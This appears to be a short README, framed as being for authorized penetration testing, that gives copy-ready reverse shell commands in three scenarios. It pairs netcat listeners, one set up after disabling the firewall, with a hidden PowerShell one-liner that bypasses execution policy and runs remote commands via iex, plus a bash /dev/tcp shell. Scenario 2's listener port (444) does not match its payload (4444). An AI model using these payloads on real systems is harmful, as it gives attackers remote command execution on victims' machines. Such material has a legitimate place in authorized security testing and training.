
# # PowerShell Reverse Shell Guide

**Author: Yash Tamboli**

⚠️ **FOR AUTHORIZED PENETRATION TESTING ONLY**  
*(Yash Tamboli has explicit permission to perform these tests)*

This repository contains simple scripts and instructions for creating reverse shells. It is designed for educational purposes and authorized security assessments.

---


## Deployment

## 🚀 Quick Start Scenarios

### **Scenario 1: Windows → Linux (Most Common)**
**Attacker (Linux):**


```bash
  sudo ufw disable
  nc -lnvp 4444 -k
```
Target (Windows): Replace 192.168.1.100 with your Linux attacker IP.

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

```
## **Scenario 2: Windows → Windows**
Attacker (Windows): Open PowerShell as Administrator and run:
```bash
ncat -lvp 444
```
(If ncat isn't installed, download Nmap's ncat or use a GUI listener like Netcat for Windows).

**Target (Windows)**: Replace 192.168.1.100 with your Windows attacker IP.
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

```
## **Scenario 3: Linux → Linux**
Attacker (Linux):

``` bash
nc -lnvp 4444
```
**Target (Linux)**: Replace 192.168.1.100 with your Linux attacker IP.

```bash 
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
